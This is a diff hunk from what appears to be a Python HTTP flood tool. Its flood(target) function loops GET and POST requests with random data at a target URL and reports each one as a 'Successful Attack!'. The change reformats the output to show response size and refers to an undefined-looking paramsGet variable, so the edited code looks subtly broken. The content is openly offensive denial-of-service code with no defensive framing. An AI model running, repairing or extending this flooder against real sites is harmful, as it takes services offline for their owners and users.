@@ -100,12 +100,15 @@ def flood(target: str) -> None:
             params = generate_rand_data()
 
             if type_request == "GET":
-                response = requests.get(target, headers=headers, params=params, timeout=5)
+                response = requests.get(target, headers=headers, params=paramsGet, timeout=5)
             else:
                 response = requests.post(target, headers=headers, timeout=5)
-
-            status_color = F.GREEN if response.status_code == 200 else F.RED
-            print(f"{status_color}({response.status_code}) {F.CYAN}{type_request} Successful Attack!{F.RESET}")
+            
+            colorF_G = f"{F.GREEN if response.status_code == 200 else F.RED}"
+            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
+            payload_size = f"{colorF_G} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
+            request_info = f"{F.CYAN}{type_request}{F.RESET}"
+            print(f"{status}:{request_info} Successful Attack! --> {payload_size} {F.RESET}{F.RESET}")
 
         except requests.exceptions.RequestException:
             print(f"{F.RED}( !!! ) {F.RESET}Request Failed...")
